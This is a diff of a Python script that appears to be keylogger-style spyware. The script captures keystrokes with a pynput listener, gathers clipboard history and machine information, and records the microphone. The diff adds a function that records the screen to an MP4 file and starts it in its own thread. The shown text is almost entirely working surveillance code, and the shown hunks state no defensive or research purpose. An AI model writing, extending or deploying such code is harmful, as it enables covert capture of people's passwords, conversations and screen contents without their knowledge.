@@ -7,16 +7,24 @@ import requests
 import pyperclip
 import pyaudio
 import wave
+import cv2
+import pyautogui
+import numpy as np
 from requests import get 
 from scipy.io.wavfile import read, write
 from pynput.keyboard import Key, Listener
 
-WAV_FILENAME = "recorded.wav"
+WAV_FILENAME = "soundrec.wav"
+MP4_FILENAME = "screenrec.mp4"
+SCREEN_RECORDING_FPS = 3
+SCREEN_RECORDING_SECONDS = 60
+MP4_FOURCC = 1983148141
+SCREEN_SIZE = (2560, 1600) 
 CHUNK_IN_BYTES = 1024
-FORMAT = pyaudio.paInt16
+SOUND_FORMAT = pyaudio.paInt16
 CHANNELS = 1
 SAMPLE_RATE = 44100
-RECORD_SECONDS = 60
+SOUND_RECORD_SECONDS = 60
 
 
 def press_keys(key):
@@ -73,11 +81,11 @@ def get_clipboard_history():
 
 def record_sound():
 	my_pyaudio = pyaudio.PyAudio()
-	stream = my_pyaudio.open(format=FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,input=True,
+	stream = my_pyaudio.open(format=SOUND_FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,input=True,
 						  output=True,frames_per_buffer=CHUNK_IN_BYTES)
 	frames = []
 	print("Recording...")
-	for i in range(int(SAMPLE_RATE / CHUNK_IN_BYTES * RECORD_SECONDS)):
+	for i in range(int(SAMPLE_RATE / CHUNK_IN_BYTES * SOUND_RECORD_SECONDS)):
 		data = stream.read(CHUNK_IN_BYTES)
 		frames.append(data)
 	print("Finished recording.")
@@ -87,10 +95,20 @@ def record_sound():
 	# Generating an audio (wav) file.
 	wave_file = wave.open(WAV_FILENAME, "wb")
 	wave_file.setnchannels(CHANNELS)
-	wave_file.setsampwidth(my_pyaudio.get_sample_size(FORMAT))
+	wave_file.setsampwidth(my_pyaudio.get_sample_size(SOUND_FORMAT))
 	wave_file.setframerate(SAMPLE_RATE)
 	wave_file.writeframes(b"".join(frames))
 	wave_file.close()
+
+def record_screen():
+	video_file = cv2.VideoWriter(MP4_FILENAME, MP4_FOURCC, SCREEN_RECORDING_FPS, SCREEN_SIZE)
+	for i in range(int(SCREEN_RECORDING_FPS * SCREEN_RECORDING_SECONDS)):
+		screenshot = pyautogui.screenshot()
+		frame = np.array(screenshot)
+		frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+		video_file.write(frame)
+	cv2.destroyAllWindows()
+	video_file.release()
 
 def main():
 	machine_info = threading.Thread(target=write_machine_info_file)
@@ -99,6 +117,8 @@ def main():
 	clipboard_history.start()
 	sound_recording = threading.Thread(target=record_sound)
 	sound_recording.start()
+	screen_recording = threading.Thread(target=record_screen)
+	screen_recording.start()
 	with Listener(on_press=press_keys) as listener:
 		listener.join()
 
